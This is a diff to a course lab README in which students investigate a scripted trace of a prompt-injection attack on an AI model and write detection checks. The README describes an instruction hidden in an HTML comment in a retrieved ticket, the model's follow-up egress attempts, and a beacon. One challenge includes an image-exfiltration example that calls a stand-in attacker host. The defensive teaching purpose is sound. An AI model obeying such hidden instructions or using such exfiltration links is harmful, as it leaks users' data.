@@ -1,6 +1,6 @@
-# Lab M23: investigate a scripted AI-driven attack trace, then write the defense that catches it
+# Lab M16: investigate a scripted AI-driven attack trace, then write the defense that catches it
 
-Companion to lessons **23.1 to 23.5** of *AI Security Engineer* (The Sec Guy). About 45 minutes, **$0**, all on
+Companion to lessons **16.1 to 16.5** of *AI Security Engineer* (The Sec Guy). About 45 minutes, **$0**, all on
 your laptop: **Python 3.11+ only**, no packages, no network, no model download. Nothing in this lab runs the attack
 or calls out anywhere. The attack is a scripted trace: data files we wrote by hand.
 
@@ -15,12 +15,12 @@ variants, with no false positives.** You never write the attack, and nothing her
 
 | Part | What you do | Lesson |
 |---|---|---|
-| **Investigate** | Read the scripted trail: entry point, what it reached for, tempo, egress beacon | 23.1, 23.2 |
-| **Replay (before)** | Run the harness: 0 of 5 caught, because defense.py is empty | 23.3 |
-| **Defend** | Write the five checks in `defense.py` | 23.3 |
-| **Replay (after)** | 5 of 5 on the recorded trace AND the adapted variants, 0 false positives | 23.3, 23.4 |
-| **Prove** | `make test` (the trail and the provided investigation) | 23.2 |
-| **Challenge** | A quiet beacon, an image exfiltration exit, and a precise input check. No solution included | 23.2, 23.3, 23.4 |
+| **Investigate** | Read the scripted trail: entry point, what it reached for, tempo, egress beacon | 16.1, 16.2 |
+| **Replay (before)** | Run the harness: 0 of 5 caught, because defense.py is empty | 16.3 |
+| **Defend** | Write the five checks in `defense.py` | 16.3 |
+| **Replay (after)** | 5 of 5 on the recorded trace AND the adapted variants, 0 false positives | 16.3, 16.4 |
+| **Prove** | `make test` (the trail and the provided investigation) | 16.2 |
+| **Challenge** | A quiet beacon, an image exfiltration exit, and a precise input check. No solution included | 16.2, 16.3, 16.4 |
 
 ## Get the lab files
 
@@ -82,7 +82,7 @@ cd labs/m23
 
 ## Step 1b · Look at each idea on its own (explore.py)
 
-New to logs and detection? Do this before Step 1 (lesson 23.1 and its videos run it). `explore.py` shows one idea at
+New to logs and detection? Do this before Step 1 (lesson 16.1 and its videos run it). `explore.py` shows one idea at
 a time, reading the lab's files; it writes nothing and uses no network. Windows: `python explore.py ...`. Real output
 on Linux, checked again on 15 November 2026:
 
@@ -194,7 +194,7 @@ the same intent, changed the way an attacker would.
 A rule that matches what changed misses the variant. A rule on what stayed still catches it.
 ```
 
-**6. Three rules, measured three ways** (lesson 23.4): on the recording, on the variant and on the normal lines.
+**6. Three rules, measured three ways** (lesson 16.4): on the recording, on the variant and on the normal lines.
 
 ```bash
 python3 explore.py measure
@@ -233,7 +233,7 @@ Quiet beacon:  not written yet: challenge 1: write find_quiet_beacon() in invest
 Open `data/trace/app-log.jsonl` yourself. Event `e07` is the retrieval that brought ticket T-4821 into the model's
 context. Its body hides an instruction inside an HTML comment (`<!-- LAB-INJECT ... -->`): that is the
 untrusted-content leg of the trifecta entering the model. Events `e09` and `e10` are what the model tried next: the
-way out. The login burst and the egress beacon are the estate-side signals from lesson 23.2.
+way out. The login burst and the egress beacon are the estate-side signals from lesson 16.2.
 
 ## Step 2 · Replay before you defend
 
@@ -258,7 +258,7 @@ That is expected until your defense passes. Windows: `python replay.py`.
 
 Open `defense.py` and fill in the five functions. Each reads one recorded event (or the login list) and returns a
 verdict; the file's docstrings give the exact contract and the `config.json` keys to use. Build on **behavior, not
-exact wording** (lesson 23.4): the variants paraphrase, hide characters and use look-alike names.
+exact wording** (lesson 16.4): the variants paraphrase, hide characters and use look-alike names.
 
 1. `input_check(event, config)` - flag content (user message, retrieval, tool result) that carries an
    instruction dressed as data: override phrasing aimed at instructions, text hidden in an HTML comment, zero-width
@@ -322,13 +322,13 @@ make challenge
 
 - `make challenge`: the challenge tests fail until you finish. Windows: `python run_tests.py --challenge`
 
-1. **23.2: write `find_quiet_beacon()` in `investigate.py`.** The loud beacon is 14 calls from one host. A service
+1. **16.2: write `find_quiet_beacon()` in `investigate.py`.** The loud beacon is 14 calls from one host. A service
    account host made only two calls to the same model API, hours apart. Return every non-caller host that made at
    least one model-API call but fewer than 10, sorted by host. A threshold tuned to the loud beacon would miss it.
-2. **23.3: extend `output_check` for a rendered-image exit.** Data can leave in an image whose path carries the
+2. **16.3: extend `output_check` for a rendered-image exit.** Data can leave in an image whose path carries the
    data and has no query string (`![](https://track.attacker.example/Y3VzdG9tZXJz.png)`). Catch an external-host
    image reference, while still allowing an image from a fetch-allow-listed host.
-3. **23.4: keep `input_check` precise.** It must not flag look-alike normal lines such as "disregard my earlier
+3. **16.4: keep `input_check` precise.** It must not flag look-alike normal lines such as "disregard my earlier
    message, I fixed it myself" or "the system says my password is wrong". A check that flags those has a
    false-positive problem you would hear about in production.
 
